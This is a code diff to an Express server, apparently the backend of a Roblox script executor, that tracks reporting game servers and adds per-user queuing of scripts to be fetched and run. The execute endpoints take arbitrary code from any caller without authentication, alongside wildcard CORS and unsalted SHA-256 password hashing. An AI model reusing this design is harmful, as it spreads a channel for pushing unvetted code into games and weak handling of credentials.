@@ -4,10 +4,11 @@ const crypto = require('crypto');
 const app = express();
 
 // In‑memory stores
-const users = {};          // username -> { passwordHash, isAdmin, usedKey }
-const keys = {};           // key -> { usedBy: username or null }
-const sessions = {};       // token -> username
-const gamesMap = {};       // gameId -> { name, placeId, players, servers: [serverId], lastSeen }
+const users = {};
+const keys = {};
+const sessions = {};
+const gamesMap = {};
+const userScripts = {};
 
 function hashPassword(pw) {
     return crypto.createHash('sha256').update(pw).digest('hex');
@@ -41,7 +42,7 @@ function requireAdmin(req, res, next) {
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
+    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, X-Target-User');
     if (req.method === 'OPTIONS') return res.sendStatus(200);
     next();
 });
@@ -63,12 +64,11 @@ console.log(`Admin key: ${adminKey}`);
 let targetUsername = "";
 let latestScript = "";
 
-// Clean up stale servers every 30 seconds
+// Clean up stale servers
 setInterval(() => {
     const now = Date.now();
     for (const gameId in gamesMap) {
         const game = gamesMap[gameId];
-        // Remove servers that haven't reported for >30 seconds
         game.servers = game.servers.filter(srv => now - srv.lastSeen < 30000);
         if (game.servers.length === 0) {
             delete gamesMap[gameId];
@@ -137,33 +137,26 @@ app.post('/api/games/update', (req, res) => {
         
         incomingGames.forEach(game => {
             if (!game.id) return;
-            
             const now = Date.now();
             if (!gamesMap[game.id]) {
                 gamesMap[game.id] = {
                     name: game.name,
                     placeId: game.placeId,
-                    players: game.players,        // global player count from Roblox API
+                    players: game.players,
                     servers: []
                 };
             }
             const entry = gamesMap[game.id];
-            // Update game info (name might change, etc.)
             entry.name = game.name;
             entry.placeId = game.placeId;
-            entry.players = game.players;          // use the global count sent by the server
-            // Keep track of this server instance
-            const existingServer = entry.servers.find(s => s.id === game.serverId);
-            if (existingServer) {
-                existingServer.lastSeen = now;
+            entry.players = game.players;
+            const existing = entry.servers.find(s => s.id === game.serverId);
+            if (existing) {
+                existing.lastSeen = now;
             } else {
-                entry.servers.push({
-                    id: game.serverId,
-                    lastSeen: now
-                });
+                entry.servers.push({ id: game.serverId, lastSeen: now });
             }
         });
-        
         res.send('OK');
     } catch (e) {
         console.error('Error updating games:', e);
@@ -173,13 +166,12 @@ app.post('/api/games/update', (req, res) => {
 
 app.get('/api/games', (req, res) => {
     const gamesList = Object.values(gamesMap).map(game => ({
-        id: Object.keys(gamesMap).find(k => gamesMap[k] === game), // crude, but works
+        id: Object.keys(gamesMap).find(k => gamesMap[k] === game),
         name: game.name,
         placeId: game.placeId,
-        players: game.players,          // this is already the global total
+        players: game.players,
         servers: game.servers.length
     }));
-    
     res.json({
         total: gamesList.length,
         players: gamesList.reduce((sum, g) => sum + (g.players || 0), 0),
@@ -199,13 +191,35 @@ app.get('/api/getuser', (req, res) => {
 
 // ========== Executor endpoints ==========
 app.post('/api/execute', (req, res) => {
-    latestScript = req.body || "";
-    res.send('OK');
+    try {
+        const targetUser = req.headers['x-target-user'] || req.query.user;
+        const script = req.body || "";
+        if (targetUser) {
+            userScripts[targetUser] = script;
+            console.log(`📝 Script stored for user: ${targetUser}, length: ${script.length}`);
+        } else {
+            latestScript = script;
+            console.log('📝 Script stored globally');
+        }
+        res.send('OK');
+    } catch (e) {
+        console.error('❌ Execute error:', e);
+        res.status(500).send('Error storing script');
+    }
 });
 
 app.get('/api/execute', (req, res) => {
-    res.send(latestScript);
-    latestScript = "";
+    const targetUser = req.query.user;
+    if (targetUser && userScripts[targetUser]) {
+        const script = userScripts[targetUser];
+        delete userScripts[targetUser];
+        res.send(script);
+    } else if (!targetUser) {
+        res.send(latestScript);
+        latestScript = "";
+    } else {
+        res.send("");
+    }
 });
 
 // ========== Test endpoint ==========
